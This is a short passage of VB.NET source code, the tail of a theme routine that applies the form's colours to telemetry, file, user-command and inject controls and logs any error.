            Main_Telemetry_Telemetry_ListBox.BackColor = Me.BackColor
            Main_Telemetry_Telemetry_ListBox.ForeColor = Me.ForeColor

            Main_Telemetry_Files_ListBox.BackColor = Me.BackColor
            Main_Telemetry_Files_ListBox.ForeColor = Me.ForeColor

            Main_Users_Command_ComboBox.BackColor = Me.BackColor
            Main_Users_Command_ComboBox.ForeColor = Me.ForeColor

            Main_Inject_TextBox.BackColor = Me.BackColor
            Main_Inject_TextBox.ForeColor = Me.ForeColor

        Catch ex As Exception
            AddToLog("ThemeManager@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
End Class
